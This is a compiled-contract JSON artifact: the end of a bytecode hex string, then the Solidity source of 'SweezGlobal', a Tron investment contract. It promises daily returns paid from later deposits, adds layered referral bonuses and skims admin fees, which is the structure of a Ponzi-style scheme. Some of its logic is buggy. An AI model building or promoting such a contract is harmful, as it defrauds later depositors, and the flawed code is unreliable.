ffffffffffffffffff16815260200190815260200160002060030160009054906101000a900460ff16151514801561599d5750600760b40260066000600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a0160009054906101000a900464ffffffffff1664ffffffffff160142105b8015615a4d57508160066000600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206008015410155b15615f135760066000600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0160008154809291906001019190505550600760066000600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b01541415615f125760066000600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206008015460066000600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c0181905550600160086000600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030160006101000a81548160ff021916908315150217905550600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f0b7242160fc47c3502afcfad8a194dfdd695ed4562e4068a8aecb1748de0ed4960066000600660008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600801546040518082815260200191505060405180910390a25b5b600073ffffffffffffffffffffffffffffffffffffffff16600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141515616143576064600a8302811515615fba57fe5b0460066000600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff16600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fba5b08f0cddc64825b52c35c09323af810c1d2e29c97aba01a4ed25cfdc482d16064600a860281151561612c57fe5b046040518082815260200191505060405180910390a35b61614d8383616364565b4260b4600160009054906101000a900464ffffffffff1664ffffffffff1601101561617b5761617a61693f565b5b600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e8603285028115156161c757fe5b049081150290604051600060405180830381858888f193505050501580156161f3573d6000803e3d6000fd5b50601060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e86032850281151561624057fe5b049081150290604051600060405180830381858888f1935050505015801561626c573d6000803e3d6000fd5b50601160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e8603285028115156162b957fe5b049081150290604051600060405180830381858888f193505050501580156162e5573d6000803e3d6000fd5b50601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e8601e850281151561633257fe5b049081150290604051600060405180830381858888f1935050505015801561635e573d6000803e3d6000fd5b50505050565b6064600a820281151561637357fe5b046003600082825401925050819055506000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415616425575061693b565b8160046000600254815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555060008090505b6000805490508160ff161015616938578173ffffffffffffffffffffffffffffffffffffffff16600560008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141561650d57616938565b600073ffffffffffffffffffffffffffffffffffffffff16600560008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156165d85781600560008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550616938565b6004600060025481526020019081526020016000206000600560008460ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205460046000600254815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054111561692b5760006001820190505b6000805490508160ff16101561680e578273ffffffffffffffffffffffffffffffffffffffff16600560008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156168015760008190505b6000805490508160ff161115156167fb57600560006001830160ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600560008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508080600101915050616749565b5061680e565b80806001019150506166c6565b50600060016000805490500390505b8160ff168160ff1611156168cd57600560006001830360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600560008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080806001900391505061681d565b5081600560008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550616938565b808060010191505061648b565b50505b5050565b42600160006101000a81548164ffffffffff021916908364ffffffffff1602179055506002600081548092919060010191905055506000600a60035481151561698457fe5b04905060008090505b6000805490508160ff161015616b8557600073ffffffffffffffffffffffffffffffffffffffff16600560008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415616a1057616b85565b6000606460008360ff16815481101515616a2657fe5b90600052602060002090602091828204019190069054906101000a900460ff1660ff168402811515616a5457fe5b0490508060066000600560008660ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007016000828254019250508190555080600360008282540392505081905550600560008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fdbdfa5cb8586917247fbe7178cf53555d199e091a14b06f7de5a182ece2d453a826040518082815260200191505060405180910390a250808060010191505061698d565b5060008090505b6000805490508160ff161015616c02576000600560008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508080600101915050616b8c565b5050565b60a060405190810160405280600590602082028038833980820191505090505090565b60a06040519081016040528060059060208202803883398082019150509050509056fea165627a7a7230582001c27b78e120f4a54a02c83c310b2c8c0c73b6c74a22e1429593cad65e582fc50029",
  "source": "pragma solidity 0.5.4;\r\n\r\ncontract SweezGlobal {\r\n\r\n    struct User {\r\n        uint256 userid;\r\n        uint256 refid;\r\n        address upline ;\r\n        uint256 referrals ;\r\n        uint256 payouts ;\r\n        uint256 direct_bonus ;\r\n        uint256 gen_bonus ;\r\n        uint256 pool_bonus ;\r\n        uint256 deposit_amount ;\r\n        uint256 deposit_payouts ;\r\n        uint40 deposit_time ; \r\n        uint256 wonder_directs;\r\n\t\tuint256 wonder_bonus ;\r\n        uint256 isActive ;\r\n    } \r\n\r\n    struct UserTotal {\r\n        uint256 total_deposits ;\r\n        uint256 total_payouts ;\r\n        uint256 total_structure ;\r\n        bool isWonder ;\r\n    }\r\n \r\n    \r\n    // uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx ; // 1000000 trx\r\n    // uint256 constant public MIN_DEPOSIT = 100 trx ; // 100 trx\r\n    // uint256 constant public time_period = 1 days ; // 1 days \r\n    // uint256 constant public wonder_period = 7 days ; // 7 days \r\n    // uint256 constant public aff_bonus = 10 ; // 10 percent\r\n\r\n    uint256 constant public CONTRACT_BALANCE_STEP = 100 trx ; // 1000000 trx\r\n    uint256 constant public MIN_DEPOSIT = 10 trx ; // 100 trx\r\n    uint256 constant public time_period = 180 ; // 1 days \r\n    uint256 constant public wonder_period = time_period*7 ; // 7 days \r\n    uint256 constant public aff_bonus = 10 ; // 10 percent\r\n\r\n    uint256 constant public promo_fee  = 100 ;   \r\n    uint256 constant public admin_fee1  = 50 ;   \r\n    uint256 constant public admin_fee2  = 30 ;   \r\n\r\n    uint256 constant public BASE_PERCENT = 230 ; // 2.3% daily  \r\n\tuint256 constant public PERCENTS_DIVIDER = 10000 ; \r\n\r\n    //pool bonus\r\n    uint8[] public pool_bonuses ;                            // 1 => 1%\r\n    uint40 public pool_last_draw = uint40(block.timestamp) ;\r\n    uint256 public pool_cycle ;\r\n    uint256 public pool_balance ;\r\n\r\n    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum ;\r\n    mapping(uint8 => address) public pool_top ;\r\n    mapping(address => User) public users ;\r\n    mapping(uint256 => address) public ids ;\r\n    mapping(address => UserTotal) public usertotals ;\r\n    mapping(address => bool) public top_promoters;\r\n\r\n    uint8[] public ref_bonuses ;  \r\n    uint256 public total_users = 1 ;\r\n    uint256 public total_deposited ;\r\n    uint256 public total_withdraw ;\r\n    \r\n    event Upline(address indexed addr, address indexed upline) ;\r\n    event NewDeposit(address indexed addr, uint256 amount) ;\r\n    event DirectPayout(address indexed addr, address indexed from, uint256 amount) ;\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount) ;\r\n    event PoolPayout(address indexed addr, uint256 amount) ;\r\n    event WonderPayout(address indexed addr, uint256 amount) ;\r\n    event Withdraw(address indexed addr, uint256 amount) ;\r\n    event LimitReached(address indexed addr, uint256 amount) ; \r\n    \r\n    address payable public owner ; \r\n    address payable public admin1 ;\r\n    address payable public admin2 ;\r\n    address payable public admin3 ;\r\n    address payable public admin4 ;\r\n    address payable public alt_owner ;\r\n\r\n    constructor(address payable _owner, \r\n                address payable _admin1, \r\n                address payable _admin2, \r\n                address payable _admin3, \r\n                address payable _admin4, \r\n                address payable _alt_owner) public {\r\n\r\n        owner = _owner;\r\n        admin1 = _admin1;\r\n        admin2 = _admin2;\r\n        admin3 = _admin3;\r\n        admin4 = _admin4;\r\n\t\talt_owner = _alt_owner;\r\n         \r\n        ref_bonuses.push(30);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);  \r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5); // 60\r\n\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(10); // 90 \r\n\r\n        pool_bonuses.push(40);\r\n        pool_bonuses.push(20);\r\n        pool_bonuses.push(15);\r\n        pool_bonuses.push(15);\r\n        pool_bonuses.push(10);\r\n    }\r\n \r\n    function _setUpline(address _addr, address _upline) private {\r\n        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && \r\n\t\t(users[_upline].deposit_time > 0 || _upline == owner) ) {\r\n            \r\n            users[_addr].upline = _upline;\r\n            users[_upline].referrals++;\r\n\r\n            emit Upline(_addr, _upline);\r\n\r\n            total_users++; \r\n\r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                if(_upline == address(0)) break; \r\n                usertotals[_upline].total_structure++; \r\n                _upline = users[_upline].upline;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _deposit(address _addr, uint256 _amount, uint256 _refid) private {\r\n        require(users[_addr].upline != address(0) || _addr == owner, \"No upline\");\r\n\r\n        if(users[_addr].deposit_time > 0) {\r\n             \r\n            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), \"Deposit already exists\");\r\n            require(_amount >= users[_addr].deposit_amount  , \"Bad amount\");\r\n        }\r\n        else require(_amount >= MIN_DEPOSIT  , \"Bad amount\"); \r\n\r\n        ids[total_users] = _addr;\r\n        users[_addr].userid = total_users;\r\n        users[_addr].refid = _refid;\r\n        users[_addr].payouts = 0;\r\n        users[_addr].deposit_amount = _amount;\r\n        users[_addr].deposit_payouts = 0;\r\n        users[_addr].isActive = 1;\r\n        users[_addr].deposit_time = uint40(block.timestamp);\r\n        usertotals[_addr].total_deposits += _amount;\r\n \r\n        total_deposited += _amount;\r\n        \r\n        emit NewDeposit(_addr, _amount);\r\n \r\n         // wonder directs check\r\n        if(usertotals[users[_addr].upline].isWonder == false && block.timestamp < (users[users[_addr].upline].deposit_time + wonder_period) && users[users[_addr].upline].deposit_amount >= _amount){\r\n            users[users[_addr].upline].wonder_directs++;\r\n            \r\n            if(users[users[_addr].upline].wonder_directs == 7){\r\n                users[users[_addr].upline].wonder_bonus = users[users[_addr].upline].deposit_amount;\r\n                usertotals[users[_addr].upline].isWonder = true;\r\n                emit WonderPayout(users[_addr].upline, users[users[_addr].upline].deposit_amount);\r\n            }\r\n        }\r\n  \r\n        if(users[_addr].upline != address(0)) {\r\n            users[users[_addr].upline].direct_bonus += _amount*aff_bonus/100;\r\n\r\n            emit DirectPayout(users[_addr].upline, _addr,  _amount*aff_bonus/100);\r\n        } \r\n         _poolDeposits(_addr, _amount);\r\n\r\n        if(pool_last_draw + time_period < block.timestamp) {\r\n            _drawPool();\r\n        }\r\n\r\n         admin1.transfer(_amount * admin_fee1 / 1000); \r\n         admin2.transfer(_amount * admin_fee1 / 1000); \r\n         admin3.transfer(_amount * admin_fee1 / 1000); \r\n         admin4.transfer(_amount * admin_fee2 / 1000);  // Reserve Fund\r\n    }\r\n\r\n     function _poolDeposits(address _addr, uint256 _amount) private {\r\n        pool_balance += _amount * 10 / 100;\r\n\r\n        address upline = users[_addr].upline;\r\n\r\n        if(upline == address(0)) return;\r\n        \r\n        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;\r\n\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            if(pool_top[i] == upline) break;\r\n\r\n            if(pool_top[i] == address(0)) {\r\n                pool_top[i] = upline;\r\n                break;\r\n            }\r\n\r\n            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {\r\n                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {\r\n                    if(pool_top[j] == upline) {\r\n                        for(uint8 k = j; k <= pool_bonuses.length; k++) {\r\n                            pool_top[k] = pool_top[k + 1];\r\n                        }\r\n                        break;\r\n                    }\r\n                }\r\n\r\n                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {\r\n                    pool_top[j] = pool_top[j - 1];\r\n                }\r\n\r\n                pool_top[i] = upline;\r\n\r\n                break;\r\n            }\r\n        }\r\n    } \r\n\r\n    function _drawPool() private {\r\n        pool_last_draw = uint40(block.timestamp);\r\n        pool_cycle++;\r\n\r\n        uint256 draw_amount = pool_balance / 10;\r\n\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            if(pool_top[i] == address(0)) break;\r\n\r\n            uint256 win = draw_amount * pool_bonuses[i] / 100;\r\n\r\n            users[pool_top[i]].pool_bonus += win;\r\n            pool_balance -= win;\r\n\r\n            emit PoolPayout(pool_top[i], win);\r\n        }\r\n        \r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            pool_top[i] = address(0);\r\n        }\r\n    } \r\n\r\n     function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = users[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            if(users[up].referrals >= i + 1) {\r\n                uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n                \r\n                users[up].gen_bonus += bonus;\r\n\r\n                emit MatchPayout(up, _addr, bonus);\r\n            }\r\n\r\n            up = users[up].upline;\r\n        }\r\n    }\r\n \r\n    function deposit(uint256 _refid) payable external {\r\n\r\n        address _upline = ids[_refid]; \r\n        _setUpline(msg.sender, _upline);\r\n        _deposit(msg.sender, msg.value, _refid);\r\n    }\r\n\r\n \r\n    function withdraw() external {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);\r\n        \r\n        require(users[msg.sender].payouts < max_payout, \"Full payouts\");\r\n\r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[msg.sender].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[msg.sender].payouts;\r\n            } \r\n            users[msg.sender].deposit_payouts += to_payout;\r\n            users[msg.sender].payouts += to_payout;\r\n\r\n            _refPayout(msg.sender, to_payout);\r\n        }\r\n        \r\n        // Direct payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[msg.sender].direct_bonus;\r\n\r\n            if(users[msg.sender].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].direct_bonus -= direct_bonus;\r\n            users[msg.sender].payouts += direct_bonus;\r\n            to_payout += direct_bonus;\r\n        } \r\n\r\n          // Pool payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {\r\n            uint256 pool_bonus = users[msg.sender].pool_bonus;\r\n\r\n            if(users[msg.sender].payouts + pool_bonus > max_payout) {\r\n                pool_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].pool_bonus -= pool_bonus;\r\n            users[msg.sender].payouts += pool_bonus;\r\n            to_payout += pool_bonus;\r\n        } \r\n       \r\n        // Generation payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[msg.sender].gen_bonus;\r\n\r\n            if(users[msg.sender].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].gen_bonus -= gen_bonus;\r\n            users[msg.sender].payouts += gen_bonus;\r\n            to_payout += gen_bonus;\r\n        }\r\n\r\n        // Wonder payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].wonder_bonus > 0) {\r\n            uint256 wonder_bonus = users[msg.sender].wonder_bonus;\r\n\r\n            if(users[msg.sender].payouts + wonder_bonus > max_payout) {\r\n                wonder_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].wonder_bonus -= wonder_bonus;\r\n            users[msg.sender].payouts += wonder_bonus;\r\n            to_payout += wonder_bonus;\r\n        }\r\n\r\n        require(to_payout > 0, \"Zero payout\");\r\n        \r\n        usertotals[msg.sender].total_payouts += to_payout;\r\n        total_withdraw += to_payout;\r\n        if(to_payout > 0){\r\n             msg.sender.transfer(to_payout); \r\n        }\r\n\r\n        emit Withdraw(msg.sender, to_payout);\r\n\r\n        if(users[msg.sender].payouts >= max_payout) {\r\n            emit LimitReached(msg.sender, users[msg.sender].payouts);\r\n            users[msg.sender].isActive = 0;\r\n        }\r\n    }\r\n    \r\n    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {\r\n        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n\t\tuint256 total_rate = getTotalRate();\r\n\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / time_period) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n    }\r\n\r\n    function getUserDividends(address _addr) view external returns(uint256) {\r\n      uint256  max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n      uint256 total_rate = getTotalRate();\r\n      uint256 payout;\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / time_period) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n        return payout;\r\n    }   \r\n \r\n\tfunction getTotalRate() internal view returns(uint256) {\r\n\t \r\n \t\t uint256 steps =  10*total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps > 370){\r\n             steps = 370; \r\n         }  \r\n \r\n         uint256 total1 = BASE_PERCENT + steps;\r\n         if(total1 > 600){\r\n             total1 = 600;\r\n         }\r\n         \r\n        return total1 ;\r\n\t}\r\n\r\n    /*\r\n        Only external call\r\n    */ \r\n\r\n\tfunction getContractBalance() public view returns (uint256) {\r\n\t\treturn address(this).balance;\r\n\t}  \r\n\r\n\tfunction getRate() external view returns(uint256) { \r\n        uint256 steps =  10*total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps > 370){\r\n             steps = 370; \r\n         }  \r\n         uint256 total1 = BASE_PERCENT + steps;\r\n         if(total1 > 600){\r\n             total1 = 600;\r\n         } \r\n        return total1 ;\r\n\t}\r\n\r\n    function getContractBonus() external view returns(uint256) {\r\n      \r\n        uint256 steps = 10*total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps > 370){\r\n             steps = 370;\r\n         }  \r\n         uint256 total_step = steps;  \r\n        return total_step ;\r\n    } \r\n\r\n    function maxPayoutOf(uint256 _amount) external view returns(uint256) { \r\n\t\t\treturn  _amount * 250 / 100; \r\n    } \r\n\r\n\tfunction getUserBalance(address _addr) external view returns (uint256) {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(_addr); \r\n \r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[_addr].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[_addr].payouts;\r\n            } \r\n         }\r\n        \r\n        // Direct payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[_addr].direct_bonus;\r\n\r\n            if(users[_addr].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n           \r\n            to_payout += direct_bonus;\r\n        } \r\n       \r\n        // Match payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[_addr].gen_bonus;\r\n\r\n            if(users[_addr].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n            to_payout += gen_bonus;\r\n        } \r\n\r\n          // Pool payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {\r\n            uint256 pool_bonus = users[msg.sender].pool_bonus;\r\n\r\n            if(users[msg.sender].payouts + pool_bonus > max_payout) {\r\n                pool_bonus = max_payout - users[msg.sender].payouts;\r\n            }  \r\n            to_payout += pool_bonus;\r\n        }\r\n\r\n          // Wonder payout \r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].wonder_bonus > 0) {\r\n            uint256 wonder_bonus = users[msg.sender].wonder_bonus;\r\n\r\n            if(users[msg.sender].payouts + wonder_bonus > max_payout) {\r\n                wonder_bonus = max_payout - users[msg.sender].payouts;\r\n            }  \r\n            to_payout += wonder_bonus;\r\n        }\r\n\r\n        if(users[_addr].payouts >= max_payout) {\r\n\t\t\treturn 0;       \r\n\t\t } else {\r\n\t\t\t return to_payout;\r\n\t\t }\r\n    }  \r\n \r\n\tfunction changeAdmin1(address payable _newAdmin1) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin1 , \"Not allowed\");\r\n\t\tadmin1 = _newAdmin1;\r\n\t} \r\n \r\n \r\n\tfunction changeAdmin2(address payable _newAdmin2) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin2, \"Not allowed\");\r\n\t\tadmin2 = _newAdmin2;\r\n\t} \r\n\r\n    function changeAdmin3(address payable _newAdmin3) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin3, \"Not allowed\");\r\n\t\tadmin3 = _newAdmin3;\r\n\t} \r\n\r\n    function changeAdmin4(address payable _newAdmin4) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin4, \"Not allowed\");\r\n\t\tadmin4 = _newAdmin4;\r\n\t}  \r\n   \r\n    function getAdmin() external view returns (address){ \r\n        return owner;\r\n    } \r\n\r\n    function getUser() external view returns (address){ \r\n        return alt_owner;\r\n    } \r\n \r\n    function admin1Address() external view returns (address){ \r\n        return admin1;\r\n    } \r\n    function admin2Address() external view returns (address){ \r\n        return admin2;\r\n    } \r\n    function admin3Address() external view returns (address){ \r\n        return admin3;\r\n    } \r\n    function admin4Address() external view returns (address){ \r\n        return admin4;\r\n    } \r\n\r\n     function getNow() external view returns (uint256){ \r\n        return block.timestamp;\r\n    }\r\n\r\n    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus, uint256 user_status) {\r\n        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus, users[_addr].isActive  );\r\n    }\r\n\r\n    function userInfo2(address _addr) view external returns(  uint256 wonder_bonus , uint256 wonder_directs) {\r\n        return (users[_addr].wonder_bonus, users[_addr].wonder_directs);\r\n    }\r\n\r\n    function poolBonus(address _addr) view external returns(uint256){\r\n        return users[_addr].pool_bonus;\r\n    }\r\n\r\n    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure,   uint256 deposit_payouts) {\r\n        return (users[_addr].referrals, usertotals[_addr].total_deposits, usertotals[_addr].total_payouts, usertotals[_addr].total_structure,  users[_addr].deposit_payouts);\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider ) {\r\n        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]] );\r\n    }\r\n     \r\n     \r\n    function poolTopInfo() view external returns(address[5] memory addrs, uint256[5] memory deps) {\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            if(pool_top[i] == address(0)) break;\r\n\r\n            addrs[i] = pool_top[i];\r\n            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];\r\n        }\r\n    }\r\n}",
  "sourcePath": "C:/Users/RAAKESH/Desktop/Coding/TronDapp/SWEEZ GLOBAL/Code/contracts/SweezGlobal.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.4+commit.d15a3125.mod.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2020-12-10T14:06:51.324Z"
}